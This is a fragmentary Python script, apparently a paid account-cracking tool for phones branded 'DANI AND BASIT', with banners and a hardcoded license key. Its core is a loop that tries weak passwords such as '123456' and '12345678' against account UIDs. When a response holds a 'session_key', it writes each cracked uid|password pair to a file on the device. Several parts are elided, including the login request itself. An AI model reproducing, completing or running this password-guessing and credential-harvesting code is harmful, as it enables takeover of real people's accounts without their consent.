...
\033[1;33m       🔥 DANI AND BASIT PAID TOOL 🔥
\033[1;32m--------------------------------------------
...
print(BANNER)
print("\033[96mEnter License Key to Continue:\033[0m\n")

valid_key = "BASIT-DANI-777"
key = input("\033[92mKEY >>> \033[0m")
...
os.system('clear')
print(' \x1b[38;5;46m Danish 🫶🏻 🔥 SERVER LOADING....')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【𓊈𒆜🅳🅰🅽🅸 🅱🅰🆂🅸🆃 👑 🆆🅾🆁🅻🅳𒆜𓊉】𓆪 \x07')


def ____banner____():
    # Importing modules and defining colors locally inside the function 
    # as per your request to avoid writing them at the top of the script.
    import os
    import sys
    
    # Define colors for better readability (optional, but good practice)
    GREEN = '\033[1;32m'
    WHITE = '\033[1;97m'
    RED = '\033[1;91m'
    YELLOW = '\033[1;33m'
    ...
    # Border top line
    print(f"{GREEN}{'═' * 50}{RESET}") # Top border
...
{RESET}""")
    ...
    # Owner, GitHub, Version, Tool Status
    ...
    danish_text = "Danish"
    formatted_danish = f"{MAGENTA}{danish_text}{RESET}"
    
    # Aligning the name
    print(f"{GREEN}║{YELLOW} SCROLLING NAME: {formatted_danish}{' ' * (48 - 16 - len(danish_text))}{GREEN}║{RESET}")
    
    print(f"{GREEN}║{' ' * 48}║{RESET}") # Empty line inside border
    print(f"{GREEN}{'═' * 50}{RESET}") # Bottom border
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
...
def login_2(uid):
    ...
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mDANI-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
